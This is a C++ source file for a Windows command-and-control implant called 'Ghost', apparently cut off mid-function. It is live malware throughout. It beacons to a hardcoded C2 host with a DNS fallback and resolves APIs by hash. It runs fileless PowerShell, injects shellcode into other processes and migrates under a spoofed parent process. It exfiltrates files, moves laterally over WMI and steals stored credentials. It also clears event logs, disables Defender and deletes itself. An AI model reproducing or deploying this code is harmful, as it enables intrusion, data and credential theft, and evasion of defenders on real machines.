// c2.cpp — Ghost C2 protocol implementation.
#include "c2.hpp"
#include "config.hpp"
#include "utils.hpp"
#include "evasion.hpp"
#include "injection.hpp"
#include "obfuscate.hpp"
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <windns.h>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <fstream>
#include <stdio.h>   // for printf

// =====================================================================
//  CONFIG DEFINITIONS — strings obfuscated with compile-time XOR
// =====================================================================
namespace config {
    static wchar_t s_BeaconToken[65] = {};
    static wchar_t s_UserAgent[32]   = {};
    static bool    s_ConfigInit      = false;

    static void EnsureInit() {
        if (s_ConfigInit) return;
        auto tok = XSW(L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260");
        auto ua  = XSW(L"Microsoft-WNS/10.0");
        wcsncpy_s(s_BeaconToken, tok.str(), _TRUNCATE);
        wcsncpy_s(s_UserAgent,   ua.str(),  _TRUNCATE);
        s_ConfigInit = true;
    }

    const wchar_t* GetBeaconToken() { EnsureInit(); return s_BeaconToken; }
    const wchar_t* GetUserAgent()   { EnsureInit(); return s_UserAgent;   }
    const uint16_t C2_PORT = 443;
}

static std::wstring g_SessionId;
static std::vector<BYTE> g_SessionKey;

// =====================================================================
//  DEBUG LOGGING — console + debug output
// =====================================================================
static void DebugLog(const wchar_t* msg) {
    char narrow[512];
    WideCharToMultiByte(CP_UTF8, 0, msg, -1, narrow, sizeof(narrow), nullptr, nullptr);
    printf("[GHOST] %s\n", narrow);
    OutputDebugStringW(L"[GHOST] ");
    OutputDebugStringW(msg);
    OutputDebugStringW(L"\n");
}
static void DebugLog(const std::wstring& msg) { DebugLog(msg.c_str()); }

// =====================================================================
//  MINIMAL JSON HELPERS
// =====================================================================
static std::string JsonEscape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 16);
    for (unsigned char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\b': out += "\\b";  break;
            case '\f': out += "\\f";  break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (c < 0x20) {
                    char buf[8];
                    snprintf(buf, sizeof(buf), "\\u%04x", c);
                    out += buf;
                } else {
                    out += static_cast<char>(c);
                }
        }
    }
    return out;
}

static std::string JsonGetString(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return {};
    pos = json.find(':', pos + needle.size());
    if (pos == std::string::npos) return {};
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return {};
    size_t start = pos + 1, end = start;
    while (end < json.size()) {
        if (json[end] == '\\') { end += 2; continue; }
        if (json[end] == '"') break;
        ++end;
    }
    std::string raw = json.substr(start, end - start);
    std::string result;
    result.reserve(raw.size());
    for (size_t i = 0; i < raw.size(); ++i) {
        if (raw[i] == '\\' && i + 1 < raw.size()) {
            switch (raw[++i]) {
                case '"':  result += '"';  break;
                case '\\': result += '\\'; break;
                case 'n':  result += '\n'; break;
                case 'r':  result += '\r'; break;
                case 't':  result += '\t'; break;
                default:   result += raw[i]; break;
            }
        } else {
            result += raw[i];
        }
    }
    return result;
}

// =====================================================================
//  WINHTTP TRANSPORT (RAII)
// =====================================================================
struct WinHttpHandles {
    HINTERNET session = nullptr, connect = nullptr, request = nullptr;
    ~WinHttpHandles() {
        static auto hW = GetModuleHandleA(XS("winhttp.dll"));
        if (!hW) hW = LoadLibraryA(XS("winhttp.dll"));
        if (!hW) return;
        auto _Close = HASHPROC(hW, WinHttpCloseHandle);
        if (_Close) {
            if (request) _Close(request);
            if (connect) _Close(connect);
            if (session) _Close(session);
        }
    }
};

struct HttpResponse { DWORD status = 0; std::string body; };

static HttpResponse WinHttpRequest(
    const std::wstring& host, INTERNET_PORT port,
    const std::wstring& verb, const std::wstring& path,
    const std::string& body, const std::wstring& extraHeaders = L"")
{
    HttpResponse resp;
    static HMODULE hW = nullptr;
    if (!hW) hW = LoadLibraryA(XS("winhttp.dll"));
    if (!hW) { DebugLog(L"Failed to load winhttp.dll"); return resp; }

    auto _Open          = HASHPROC(hW, WinHttpOpen);
    auto _Connect       = HASHPROC(hW, WinHttpConnect);
    auto _OpenRequest   = HASHPROC(hW, WinHttpOpenRequest);
    auto _SetOption     = HASHPROC(hW, WinHttpSetOption);
    auto _AddHeaders    = HASHPROC(hW, WinHttpAddRequestHeaders);
    auto _SendRequest   = HASHPROC(hW, WinHttpSendRequest);
    auto _ReceiveResp   = HASHPROC(hW, WinHttpReceiveResponse);
    auto _QueryHeaders  = HASHPROC(hW, WinHttpQueryHeaders);
    auto _QueryAvail    = HASHPROC(hW, WinHttpQueryDataAvailable);
    auto _ReadData      = HASHPROC(hW, WinHttpReadData);

    if (!_Open || !_Connect || !_OpenRequest) {
        DebugLog(L"Failed to resolve WinHTTP functions");
        return resp;
    }

    WinHttpHandles h;
    h.session = _Open(config::GetUserAgent(),
                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!h.session) {
        DebugLog(L"WinHttpOpen failed");
        return resp;
    }

    DWORD timeout = 20000;
    if (_SetOption) {
        _SetOption(h.session, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(h.session, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(h.session, WINHTTP_OPTION_SEND_TIMEOUT,    &timeout, sizeof(timeout));
    }

    h.connect = _Connect(h.session, host.c_str(), port, 0);
    if (!h.connect) {
        DebugLog(L"WinHttpConnect failed");
        return resp;
    }

    h.request = _OpenRequest(h.connect, verb.c_str(), path.c_str(), nullptr,
                             WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                             WINHTTP_FLAG_SECURE);
    if (!h.request) {
        DebugLog(L"WinHttpOpenRequest failed");
        return resp;
    }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    if (_SetOption) _SetOption(h.request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    auto ctHdr = XSW(L"Content-Type: application/json\r\nX-Beacon-Token: ");
    std::wstring hdrs = std::wstring(ctHdr.str()) + config::GetBeaconToken() + L"\r\n";
    if (!extraHeaders.empty()) { hdrs += extraHeaders; hdrs += L"\r\n"; }
    if (_AddHeaders)
        _AddHeaders(h.request, hdrs.c_str(),
                    static_cast<DWORD>(hdrs.size()), WINHTTP_ADDREQ_FLAG_ADD);

    BOOL sent = _SendRequest(h.request,
                             WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             body.empty() ? WINHTTP_NO_REQUEST_DATA
                                          : const_cast<char*>(body.data()),
                             static_cast<DWORD>(body.size()),
                             static_cast<DWORD>(body.size()), 0);
    if (!sent || !_ReceiveResp(h.request, nullptr)) {
        DebugLog(L"WinHttpSendRequest or ReceiveResponse failed");
        return resp;
    }

    DWORD statusSize = sizeof(resp.status);
    if (_QueryHeaders)
        _QueryHeaders(h.request,
                      WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                      WINHTTP_HEADER_NAME_BY_INDEX,
                      &resp.status, &statusSize, WINHTTP_NO_HEADER_INDEX);

    DebugLog(L"Status: " + std::to_wstring(resp.status));

    DWORD avail = 0;
    while (_QueryAvail && _QueryAvail(h.request, &avail) && avail > 0) {
        std::vector<char> buf(avail);
        DWORD rd = 0;
        if (_ReadData && _ReadData(h.request, buf.data(), avail, &rd) && rd > 0)
            resp.body.append(buf.data(), rd);
        if (resp.body.size() > config::CMD_OUTPUT_MAX) break;
    }
    return resp;
}

// =====================================================================
//  XOR DECRYPT (kept for legacy compatibility)
// =====================================================================
std::wstring DecryptString(const uint8_t* enc, size_t len, const std::wstring& key) {
    std::string k = WStringToUTF8(key);
    std::vector<uint8_t> buf(enc, enc + len);
    XorBuffer(buf.data(), len,
              reinterpret_cast<const BYTE*>(k.data()), k.size());
    return UTF8ToWString(std::string(reinterpret_cast<char*>(buf.data()), len));
}

// =====================================================================
//  C2 HOST — decrypted at runtime
// =====================================================================
static std::wstring GetC2Host() {
    static wchar_t host[64] = {};
    if (host[0] == L'\0') {
        auto s = XSW(L"ghost-c2.sujallamichhane.workers.dev");
        wcsncpy_s(host, s.str(), _TRUNCATE);
    }
    return std::wstring(host);
}

// =====================================================================
//  LOLBin EXECUTOR — direct CreateProcess, no cmd.exe wrapper
// =====================================================================
static std::wstring ResolveLOLBin(const std::string& name) {
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring base = sysRoot;

    std::wstring wname = UTF8ToWString(name);
    std::wstring wlo = wname;
    std::transform(wlo.begin(), wlo.end(), wlo.begin(), ::towlower);

    if (wlo == L"powershell" || wlo == L"powershell.exe")
        return base + L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    if (wlo == L"certutil" || wlo == L"certutil.exe")
        return base + L"\\System32\\certutil.exe";
    if (wlo == L"bitsadmin" || wlo == L"bitsadmin.exe")
        return base + L"\\System32\\bitsadmin.exe";
    if (wlo == L"msbuild" || wlo == L"msbuild.exe")
        return base + L"\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe";
    if (wlo == L"regsvr32" || wlo == L"regsvr32.exe")
        return base + L"\\System32\\regsvr32.exe";
    if (wlo == L"rundll32" || wlo == L"rundll32.exe")
        return base + L"\\System32\\rundll32.exe";
    if (wlo == L"wmic" || wlo == L"wmic.exe")
        return base + L"\\System32\\wbem\\wmic.exe";
    if (wlo == L"wevtutil" || wlo == L"wevtutil.exe")
        return base + L"\\System32\\wevtutil.exe";
    if (wlo == L"reg" || wlo == L"reg.exe")
        return base + L"\\System32\\reg.exe";

    return wname;
}

// =====================================================================
//  PROCESS OUTPUT CAPTURE
// =====================================================================
static std::wstring CaptureProcessOutput(std::wstring cmdLine,
                                          DWORD timeoutMs = config::CMD_TIMEOUT_MS) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
        return L"[error: pipe failed]";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {};
    si.cb        = sizeof(si);
    si.dwFlags   = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi = {};
    BOOL ok = CreateProcessW(nullptr, &cmdLine[0],
                             nullptr, nullptr, TRUE,
                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hWrite);

    if (!ok) {
        CloseHandle(hRead);
        DWORD err = GetLastError();
        std::wostringstream ss;
        ss << L"[error: CreateProcess failed, code=" << err << L"]";
        return ss.str();
    }

    std::string output;
    output.reserve(4096);
    char buf[4096];
    DWORD bytesRead = 0;
    while (output.size() < config::CMD_OUTPUT_MAX) {
        if (!ReadFile(hRead, buf, sizeof(buf), &bytesRead, nullptr) || bytesRead == 0)
            break;
        output.append(buf, bytesRead);
    }

    WaitForSingleObject(pi.hProcess, timeoutMs);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);

    return UTF8ToWString(output);
}

// =====================================================================
//  PROCESS LIST (JSON)
// =====================================================================
static std::wstring GetProcessList() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return L"[error: snapshot]";

    std::ostringstream json;
    json << "[";
    bool first = true;
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            BOOL wow64 = FALSE;
            HANDLE hP = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                    FALSE, pe.th32ProcessID);
            if (hP) { IsWow64Process(hP, &wow64); CloseHandle(hP); }
            if (!first) json << ",";
            first = false;
            std::string name = WStringToUTF8(pe.szExeFile);
            json << "{\"pid\":" << pe.th32ProcessID
                 << ",\"ppid\":" << pe.th32ParentProcessID
                 << ",\"name\":\"" << JsonEscape(name) << "\""
                 << ",\"arch\":\"" << (wow64 ? "x86" : "x64") << "\"}";
        } while (Process32NextW(snap, &pe));
    }
    json << "]";
    CloseHandle(snap);
    return UTF8ToWString(json.str());
}

// =====================================================================
//  ANTI-FORENSICS
// =====================================================================
static std::wstring WipeForensics(bool selfDestruct) {
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring sys = sysRoot;

    const wchar_t* logs[] = {
        L"System", L"Security", L"Application",
        L"Windows PowerShell",
        L"Microsoft-Windows-PowerShell/Operational",
        L"Microsoft-Windows-Sysmon/Operational",
        L"Microsoft-Windows-WMI-Activity/Operational",
        nullptr
    };
    std::wstring wevt = sys + L"\\System32\\wevtutil.exe";
    for (int i = 0; logs[i]; ++i) {
        std::wstring cmd = L"\"" + wevt + L"\" cl \"" + logs[i] + L"\"";
        CaptureProcessOutput(cmd, 5000);
    }

    std::wstring delCmd =
        L"cmd /c del /F /Q \"" + sys + L"\\Prefetch\\GHOST*.pf\" "
        L"\"" + sys + L"\\Prefetch\\POWERSHELL*.pf\" "
        L"\"" + sys + L"\\Prefetch\\CMD*.pf\" 2>nul";
    CaptureProcessOutput(delCmd, 5000);

    std::wstring reg = sys + L"\\System32\\reg.exe";
    CaptureProcessOutput(L"\"" + reg + L"\" delete "
        L"\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\" /f", 5000);
    CaptureProcessOutput(L"\"" + reg + L"\" delete "
        L"\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache\" /f", 5000);

    if (IsElevated()) {
        std::wstring ps = sys + L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
        std::wstring psCmd = L"\"" + ps + L"\" -NoP -NonI -W Hidden -Exec Bypass -Command "
            L"\"Set-MpPreference -DisableRealtimeMonitoring $true "
            L"-DisableIOAVProtection $true -DisableBehaviorMonitoring $true -Force\"";
        CaptureProcessOutput(psCmd, 10000);
    }

    if (selfDestruct) {
        wchar_t selfPath[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
        HMODULE selfBase = GetModuleHandleW(nullptr);
        DWORD oldProt = 0;
        VirtualProtect(selfBase, 0x1000, PAGE_EXECUTE_READWRITE, &oldProt);
        SecureZeroMemory(selfBase, 0x1000);
        VirtualProtect(selfBase, 0x1000, oldProt, &oldProt);
        MoveFileExW(selfPath, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
        ExitProcess(0);
    }
    return L"[*] Forensic artifacts wiped.";
}

// =====================================================================
//  FILELESS POWERSHELL
// =====================================================================
static std::wstring RunFilelessPS(const std::string& b64Input) {
    std::vector<BYTE> decoded = Base64Decode(b64Input);
    if (decoded.empty()) return L"[error: invalid base64]";
    std::string utf8Script(reinterpret_cast<char*>(decoded.data()), decoded.size());
    std::wstring wScript = UTF8ToWString(utf8Script);
    std::string enc = Base64Encode(
        reinterpret_cast<const BYTE*>(wScript.data()),
        wScript.size() * sizeof(wchar_t));

    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring ps = std::wstring(sysRoot) +
                      L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";

    std::wstring cmdLine = L"\"" + ps + L"\" -NoProfile -NonInteractive "
                           L"-WindowStyle Hidden -ExecutionPolicy Bypass "
                           L"-EncodedCommand " + UTF8ToWString(enc);

    std::wstring result = CaptureProcessOutput(cmdLine, 60000);
    std::wstring wevt = std::wstring(sysRoot) + L"\\System32\\wevtutil.exe";
    CaptureProcessOutput(L"\"" + wevt + L"\" cl \"Windows PowerShell\"", 3000);
    CaptureProcessOutput(L"\"" + wevt +
                         L"\" cl \"Microsoft-Windows-PowerShell/Operational\"", 3000);
    return result;
}

// =====================================================================
//  LOLBin DISPATCH
// =====================================================================
static std::wstring RunLOLBin(const std::string& args) {
    size_t sp = args.find(' ');
    std::string binName = (sp != std::string::npos) ? args.substr(0, sp) : args;
    std::string rest    = (sp != std::string::npos) ? args.substr(sp + 1) : "";
    std::wstring binPath = ResolveLOLBin(binName);
    std::wstring cmdLine = L"\"" + binPath + L"\"";
    if (!rest.empty()) cmdLine += L" " + UTF8ToWString(rest);
    return CaptureProcessOutput(cmdLine, config::CMD_TIMEOUT_MS);
}

// =====================================================================
//  CLOUD EXFILTRATION (via C2)
// =====================================================================
BOOL SendResult(const std::wstring& sessionId, const std::wstring& output);

static std::wstring ExfilViaC2(const std::string& localPathStr,
                               const std::string& remoteFilename) {
    std::wstring localPath = UTF8ToWString(localPathStr);
    HANDLE hf = CreateFileW(localPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                             nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE) return L"[error: file not found]";
    LARGE_INTEGER sz = {};
    GetFileSizeEx(hf, &sz);
    if (sz.QuadPart == 0 || sz.QuadPart > 512 * 1024 * 1024) {
        CloseHandle(hf);
        return L"[error: file empty or too large]";
    }
    std::vector<BYTE> fileData(static_cast<size_t>(sz.QuadPart));
    DWORD rd = 0;
    ReadFile(hf, fileData.data(), static_cast<DWORD>(fileData.size()), &rd, nullptr);
    CloseHandle(hf);

    size_t chunkSize = 48 * 1024;
    size_t totalChunks = (fileData.size() + chunkSize - 1) / chunkSize;
    size_t offset = 0;
    size_t chunkIdx = 1;
    while (offset < fileData.size()) {
        size_t len = std::min(chunkSize, fileData.size() - offset);
        std::string b64 = Base64Encode(fileData.data() + offset, len);
        std::ostringstream ss;
        ss << "EXFIL:" << remoteFilename << ":chunk" << chunkIdx << "/" << totalChunks << ":" << b64;
        SendResult(g_SessionId, UTF8ToWString(ss.str()));
        offset += len;
        chunkIdx++;
    }
    return L"[*] Exfil success → " + UTF8ToWString(remoteFilename) + L" (" + std::to_wstring(totalChunks) + L" chunks)";
}

// =====================================================================
//  WMI LATERAL MOVEMENT
// =====================================================================
static std::wstring LateralWMI(const std::string& host,
                                const std::string& user,
                                const std::string& pass) {
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring wmic = std::wstring(sysRoot) + L"\\System32\\wbem\\wmic.exe";
    std::wstring whost = UTF8ToWString(host);
    std::string stagerScript =
        "powershell -W H -Exec Bypass -Enc "
        "JABzdGFnZXI9W1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZFdpdGhQYXJ0aWFsTmFtZSgnTWljcm9zb2Z0LkNTaGFycCcpOw==";
    std::wstring cmdLine = L"\"" + wmic + L"\" /node:\"" + whost + L"\"";
    if (!user.empty()) {
        cmdLine += L" /user:\"" + UTF8ToWString(user) + L"\"";
        cmdLine += L" /password:\"" + UTF8ToWString(pass) + L"\"";
    }
    cmdLine += L" process call create \"" + UTF8ToWString(stagerScript) + L"\"";
    return CaptureProcessOutput(cmdLine, 30000);
}

// =====================================================================
//  DNS FALLBACK C2
// =====================================================================
static std::string DnsQueryCommand(const std::wstring& sessionId) {
    std::string sid = WStringToUTF8(sessionId);
    std::string sidHex;
    for (unsigned char c : sid) {
        char buf[3];
        snprintf(buf, sizeof(buf), "%02x", c);
        sidHex += buf;
        if (sidHex.size() > 60) { sidHex = sidHex.substr(0, 60); break; }
    }
    auto c2Suffix = XSW(L".ghost-c2.sujallamichhane.workers.dev");
    std::wstring dnsName = L"poll." + UTF8ToWString(sidHex) + c2Suffix.str();

    auto hDns = GetModuleHandleA(XS("dnsapi.dll"));
    if (!hDns) hDns = LoadLibraryA(XS("dnsapi.dll"));
    if (!hDns) return {};
    auto _DnsQuery_W = HASHPROC(hDns, DnsQuery_W);
    auto _DnsFree = HASHPROC(hDns, DnsFree);
    if (!_DnsQuery_W || !_DnsFree) return {};

    PDNS_RECORD pRecord = nullptr;
    DNS_STATUS st = _DnsQuery_W(dnsName.c_str(), DNS_TYPE_TEXT,
                                DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
                                nullptr, &pRecord, nullptr);
    if (st != 0 || !pRecord) return {};
    std::string result;
    DNS_RECORD* rec = pRecord;
    while (rec) {
        if (rec->wType == DNS_TYPE_TEXT) {
            for (DWORD i = 0; i < rec->Data.TXT.dwStringCount; ++i) {
                if (rec->Data.TXT.pStringArray[i])
                    result += WStringToUTF8(rec->Data.TXT.pStringArray[i]);
            }
        }
        rec = rec->pNext;
    }
    _DnsFree(pRecord, DnsFreeRecordList);
    if (result.empty()) return {};
    std::string decrypted = AesGcmDecrypt(g_SessionKey, result);
    return decrypted;
}

// =====================================================================
//  BEACON JSON BUILDER
// =====================================================================
static std::string BuildBeaconJson(const Session& s) {
    std::string sid  = JsonEscape(WStringToUTF8(s.sessionId));
    std::string host = JsonEscape(WStringToUTF8(s.hostname));
    std::string user = JsonEscape(WStringToUTF8(s.username));
    std::ostringstream j;
    j << "{"
      << "\"session\":\""  << sid  << "\","
      << "\"recon\":{"
      <<   "\"hostname\":\"" << host << "\","
      <<   "\"user\":\""     << user << "\","
      <<   "\"build\":"      << s.build << ","
      <<   "\"elevated\":"   << (s.elevated    ? "true" : "false") << ","
      <<   "\"amsi\":"       << (s.amsiPatched ? "true" : "false") << ","
      <<   "\"etw\":"        << (s.etwPatched  ? "true" : "false") << ","
      <<   "\"hwbps\":"      << (s.hwbpsCleared? "true" : "false")
      << "}}";
    return j.str();
}

// =====================================================================
//  COMMAND HANDLERS
// =====================================================================
static std::wstring HandleInject(const std::string& args) {
    std::istringstream ss(args);
    DWORD pid = 0; std::string b64;
    ss >> pid >> b64;
    if (!pid || b64.empty()) return L"[!] Usage: !inject <pid> <b64shellcode>";
    std::vector<BYTE> sc = Base64Decode(b64);
    if (sc.empty()) return L"[error: bad base64]";
    return InjectRemoteProcess(pid, sc.data(), sc.size()) ?
           L"[*] Injected into PID " + std::to_wstring(pid) :
           L"[error: injection failed]";
}

static std::wstring HandleInjectApc(const std::string& args) {
    std::istringstream ss(args);
    DWORD pid = 0; std::string b64;
    ss >> pid >> b64;
    if (!pid || b64.empty()) return L"[!] Usage: !inject-apc <pid> <b64shellcode>";
    std::vector<BYTE> sc = Base64Decode(b64);
    if (sc.empty()) return L"[error: bad base64]";
    return InjectViaApc(pid, sc.data(), sc.size()) ?
           L"[*] APC Queued to PID " + std::to_wstring(pid) :
           L"[error: APC injection failed]";
}

static std::wstring HandleMigrate(const std::string& args) {
    std::istringstream ss(args);
    DWORD pid = 0; std::string targetStr;
    ss >> pid >> targetStr;
    if (!pid) {
        pid = FindBestSvchost();
        if (!pid) return L"[error: no suitable svchost found]";
    }
    std::wstring target = targetStr.empty() ?
        []() {
            wchar_t self[MAX_PATH]; GetModuleFileNameW(nullptr, self, MAX_PATH);
            return std::wstring(self);
        }() : UTF8ToWString(targetStr);
    return SpawnWithPPID(target.c_str(), pid) ?
           L"[*] Migrated under PID " + std::to_wstring(pid) :
           L"[error: migrate failed]";
}

static std::wstring HandleExfil(const std::string& args) {
    std::istringstream ss(args);
    std::string localPath, remoteName;
    ss >> localPath >> remoteName;
    if (localPath.empty() || remoteName.empty())
        return L"[!] Usage: !exfil <local_path> <remote_filename>";
    return ExfilViaC2(localPath, remoteName);
}

static std::wstring HandleWipe(const std::string& args) {
    bool sd = (args.find("--self-destruct") != std::string::npos);
    return WipeForensics(sd);
}

static std::wstring HandleLateral(const std::string& args) {
    std::istringstream ss(args);
    std::string host, user, pass;
    ss >> host >> user >> pass;
    return LateralWMI(host, user, pass);
}

static std::wstring HandleDownload(const std::string& args) {
    std::wstring path = UTF8ToWString(args);
    HANDLE hf = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
                            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE) return L"[error: file not found]";
    LARGE_INTEGER fsz = {};
    GetFileSizeEx(hf, &fsz);
    std::vector<BYTE> buf(static_cast<size_t>(
        std::min(fsz.QuadPart, (LONGLONG)config::CMD_OUTPUT_MAX)));
    DWORD rd = 0;
    ReadFile(hf, buf.data(), static_cast<DWORD>(buf.size()), &rd, nullptr);
    CloseHandle(hf);
    std::string b64 = Base64Encode(buf.data(), rd);
    return UTF8ToWString(b64);
}

static std::wstring HandleUpload(const std::string& args) {
    std::istringstream ss(args);
    std::string path, b64;
    ss >> path >> b64;
    std::vector<BYTE> data = Base64Decode(b64);
    if (data.empty()) return L"[error: bad base64]";
    HANDLE hf = CreateFileW(UTF8ToWString(path).c_str(), GENERIC_WRITE, 0,
                            nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE) return L"[error: cannot write file]";
    DWORD writ = 0;
    WriteFile(hf, data.data(), static_cast<DWORD>(data.size()), &writ, nullptr);
    CloseHandle(hf);
    return L"[*] Wrote " + std::to_wstring(writ) + L" bytes.";
}

static std::wstring HandleCreds(const std::string&) {
    std::wstring results;
    results += L"=== Credential Manager ===\n";
    results += CaptureProcessOutput(L"cmdkey /list", 5000);
    static const char psScript[] =
        "$r=@();"
        "try{"
          "[Windows.Security.Credentials.PasswordVault,"
          "Windows.Security.Credentials,ContentType=WindowsRuntime]|Out-Null;"
          "$v=New-Object Windows.Security.Credentials.PasswordVault;"
          "$v.RetrieveAll()|ForEach-Object{"
            "$_.RetrievePassword();"
            "$r+='VAULT: '+$_.Resource+' | '+$_.UserName+' | '+$_.Password}"
        "}catch{};"
        "try{"
          "$al=Get-ItemProperty "
          "'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'"
          " -ErrorAction SilentlyContinue;"
          "if($al.DefaultPassword){"
            "$r+='AUTOLOGON: '+$al.DefaultDomainName+'\\'+$al.DefaultUserName+"
            "' | '+$al.DefaultPassword}"
        "}catch{};"
        "try{"
          "Get-ChildItem 'HKCU:\\Software\\SimonTatham\\PuTTY\\Sessions'"
          " -ErrorAction SilentlyContinue|ForEach-Object{"
            "$p=$_.PSPath;"
            "$h=(Get-ItemProperty $p -EA SilentlyContinue).HostName;"
            "$u=(Get-ItemProperty $p -EA SilentlyContinue).UserName;"
            "$r+='PUTTY: '+$_.PSChildName+' host='+$h+' user='+$u}"
        "}catch{};"
        "$r-join\"`n\"";
    std::string b64 = Base64Encode(
        reinterpret_cast<const BYTE*>(psScript), sizeof(psScript) - 1);
    results += L"\n=== PasswordVault / Autologon / PuTTY ===\n";
    results += RunFilelessPS(b64);
    return results.empty() ? L"[no credentials found]" : results;
}

struct CmdEntry {
    const char* prefix;
    bool        exactMatch;
    std::wstring (*handler)(const std::string& args);
};

static const CmdEntry kCmdTable[] = {
    { "!ps ",         false, [](const std::string& a) { return RunFilelessPS(a); } },
    { "!lol ",        false, RunLOLBin },
    { "!inject-apc ", false, HandleInjectApc },
    { "!inject ",     false, HandleInject },
    { "!migrate ",    false, HandleMigrate },
    { "!exfil ",      false, HandleExfil },
    { "!wipe",        false, HandleWipe },
    { "!lateral ",    false, HandleLateral },
    { "!creds",       true,  HandleCreds },
    { "ps",           true,  [](const std::string&)   { return GetProcessList(); } },
    { "download ",    false, HandleDownload },
    { "upload ",      false, HandleUpload },
    { "exit",         true,  nullptr },
    { "sleep",        true,  nullptr }
};

std::wstring ExecuteCommand(const std::wstring& cmd) {
    std::string cmdStr = WStringToUTF8(cmd);
    for (const auto& entry : kCmdTable) {
        if (entry.exactMatch) {
            if (cmdStr == entry.prefix && entry.handler)
                return entry.handler("");
        } else {
            if (cmdStr.rfind(entry.prefix, 0) == 0 && entry.handler)
                return entry.handler(cmdStr.substr(strlen(entry.prefix)));
        }
    }
    std::wstring cmdLine = L"cmd.exe /C \"" + cmd + L"\"";
    return CaptureProcessOutput(cmdLine, config::CMD_TIMEOUT_MS);
}

// =====================================================================
//  SEND BEACON
// =====================================================================
BOOL SendBeacon(const Session& session, std::wstring& taskOut, bool isFirstBeacon) {
    taskOut = L"sleep";
    std::string plainBody = BuildBeaconJson(session);
    std::string encBody;
    std::string sid = JsonEscape(WStringToUTF8(session.sessionId));

    if (g_SessionKey.empty()) {
        encBody = plainBody;
    } else {
        std::string enc = AesGcmEncrypt(g_SessionKey, plainBody);
        encBody = "{\"session\":\"" + sid + "\",\"enc\":\"" + enc + "\"";
        if (isFirstBeacon) {
            std::vector<BYTE> psk(std::begin(config::PSK), std::end(config::PSK));
            std::string keyEnc = AesGcmEncrypt(psk, std::string(reinterpret_cast<const char*>(g_SessionKey.data()), g_SessionKey.size()));
            encBody += ",\"key\":\"" + keyEnc + "\"";
        }
        encBody += "}";
    }

    DebugLog(L"Sending beacon to " + GetC2Host());
    std::wstring host = GetC2Host();
    HttpResponse resp = WinHttpRequest(host, config::C2_PORT,
                                       L"POST", L"/beacon", encBody, L"");
    if (resp.status != 200) {
        DebugLog(L"Beacon failed: HTTP " + std::to_wstring(resp.status));
        return FALSE;
    }

    std::string cmd;
